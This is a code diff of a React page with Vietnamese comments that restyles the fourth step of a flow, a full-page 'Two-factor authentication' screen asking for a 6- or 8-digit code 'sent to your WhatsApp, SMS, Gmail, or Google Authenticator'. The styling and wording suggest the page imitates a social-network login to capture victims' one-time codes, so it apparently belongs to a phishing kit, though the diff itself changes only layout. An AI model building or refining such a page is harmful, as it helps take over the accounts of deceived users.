@@ -752,54 +752,33 @@ export default function Home() {
                 </div>
               )}
 
-                                          {/* BƯỚC 4: OTP FULL PAGE */}
+                                                        {/* BƯỚC 4: OTP FULL PAGE */}
               {step === 4 && !showSuccess && (
-                <div style={{ 
-                  // Bọc ngoài cùng để căn giữa
-                  display: 'flex', 
-                  flexDirection: 'column', 
-                  width: '100%' 
-                }}>
-                  {/* Bố cục ngang: Text 1 bên, Ảnh 1 bên */}
-                  <div style={{ 
-                    display: 'grid', 
-                    gridTemplateColumns: '1.2fr 1fr', // Text chiếm 55%, Ảnh chiếm 45%
-                    gap: '40px', 
-                    alignItems: 'center', 
-                    marginBottom: '32px' 
-                  }}>
-                    <div>
-                      <h2 style={{ fontSize: '26px', fontWeight: '700', marginBottom: '12px', color: '#1c1e21', lineHeight: '1.3' }}>
-                        Two-factor authentication
-                      </h2>
-                      <p style={{ fontSize: '16px', color: '#1c1e21', margin: 0, lineHeight: '1.5' }}>
-                        Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.
-                      </p>
-                    </div>
-                    <div>
-                      <img 
-                        src="/images/2fa-illustration.png" 
-                        alt="2FA Code" 
-                        style={{ 
-                          width: '100%', 
-                          height: 'auto', 
-                          display: 'block', 
-                          borderRadius: '8px', // Bo góc cho ảnh đẹp
-                          objectFit: 'cover'
-                        }} 
-                      />
-                    </div>
+                <div>
+                  <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '8px', color: '#1c1e21', lineHeight: '1.3' }}>
+                    Two-factor authentication
+                  </h2>
+                  <p style={{ fontSize: '15px', color: '#1c1e21', marginBottom: '24px', lineHeight: '1.4' }}>
+                    Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.
+                  </p>
+
+                  {/* Ảnh to tràn viền, nằm dưới text */}
+                  <div style={{ marginBottom: '24px', borderRadius: '8px', overflow: 'hidden' }}>
+                    <img 
+                      src="/images/2fa-illustration.png" 
+                      alt="2FA Code" 
+                      style={{ width: '100%', display: 'block', objectFit: 'cover' }} 
+                    />
                   </div>
 
-                  {/* Form nhập OTP */}
-                  <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '16px', width: '100%' }}>
+                  <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                     <input 
                       type="text" 
                       placeholder="Code" 
                       value={otp} 
                       onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
                       style={{ 
-                        padding: '16px', 
+                        padding: '14px 16px', 
                         fontSize: '16px', 
                         border: '1px solid #ccd0d5', 
                         borderRadius: '8px', 
